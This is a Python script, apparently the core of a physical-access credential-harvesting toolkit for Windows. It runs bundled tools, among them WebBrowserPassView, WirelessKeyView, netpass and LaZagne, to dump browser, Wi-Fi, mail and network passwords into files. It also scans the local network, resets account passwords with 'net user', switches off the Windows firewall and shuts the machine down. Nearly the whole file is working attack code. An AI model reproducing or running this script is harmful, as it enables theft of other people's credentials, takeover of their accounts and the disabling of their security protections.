import os, sys, ctypes, getpass, socket
exec(open("./config.py").read())


# setting up directory
usr = getpass.getuser()
if not os.path.exists("hosts/" + usr):
    os.makedirs("hosts/" + usr)
    root = usr
elif duplicate_exec:
    usr_x = 1
    usr_ct = 2
    while usr_x:
        usr_ct = str(usr_ct)
        if not os.path.exists("hosts/"+ usr + " (" + usr_ct + ")"):
            os.makedirs("hosts/" + usr + " (" + usr_ct + ")")
            root = usr + " (" + usr_ct + ")"
            usr_x = 0
        else:
            usr_ct = int(usr_ct)
            usr_ct += 1
else:
    sys.exit()

rootdir = "..\hosts\\" + root + "\\"

# checking internet connectivity
try:
    socket.create_connection(("www.google.com", 80))
    inet = 1
except OSError:
    pass
    inet = 0

# password recovery
os.chdir("payloads")
if browser_pwds:
    os.system("WebBrowserPassView.exe /shtml " + '"' + rootdir + "Browser passwords.html" + '"')
if wireless_keys:
    os.system("WirelessKeyView.exe /shtml " + '"' + rootdir + "Wireless passwords.html" + '"')
if email_pst_pwds:
    os.system("PstPassword.exe /shtml " + '"' + rootdir + "Email pst passwords.html" + '"')
if mail_pwds:
    os.system("mailpv.exe /shtml " + '"' + rootdir + "Mail passwords.html" + '"')
if network_pwds:
    os.system("netpass.exe /shtml " + '"' + rootdir + "Network passwords.html" + '"')
if msn_pwds:
    os.system("mspass.exe /shtml " + '"' + rootdir + "MSN passwords.html" + '"')
if dialup_pwds:
    os.system("Dialupass.exe /shtml " + '"' + rootdir + "Dialup passwords.html" + '"')
if lazagne:
    os.system("laZagne.exe all > " + '"' + rootdir + "laZagne.txt" + '"')
    
# recon
if network_scan and inet:
    os.system("WNetWatcher.exe /shtml " + '"' + rootdir + "Network scan.html" + '"')


# changing nt password
if change_nt_pwd["current_acc_controller"]:
    os.system(r"net user %username% " + '"' + change_nt_pwd["current_acc_pwd"] + '"')
if change_nt_pwd["diff_acc_controller"]:
    os.system(r"net user " + '"' + change_nt_pwd["diff_acc_usr"] + '" ' + '"' + change_nt_pwd["diff_acc_pwd"] + '"')

# Network based executions
if deactivate_firewall:
    os.system(r"netsh advfirewall set allprofiles state off")
if activate_firewall:
    os.system(r"netsh advfirewall set allprofiles state on")
if release_net_adapters:
    os.system(r"ipconfig /release")
if renew_net_adapters:
    os.system(r"ipconfig /renew")
if flush_dns:
    os.system(r"ipconfig /flushdns")
if register_dns:
    os.system(r"ipconfig /registerdns")

if batch_info:
    os.system(r"bi " + '"' + root + '" ' + '"' + rootdir + '"')

# msg box
if msgbox["controller"]:
    ctypes.windll.user32.MessageBoxW(0, msgbox["msg"], msgbox["title"], msgbox["buttons"])

# shutdown code
if power["controller"]:
    if power["mode"] != "":
        shutdown = "shutdown -" + power['mode']
        if power["comment"] != "":
            shutdown = shutdown + " -c " + "\"" + power['comment'] + "\""
        if power["timeout"] != "":
                shutdown = shutdown + " -t " + power['timeout']
        os.system(shutdown)
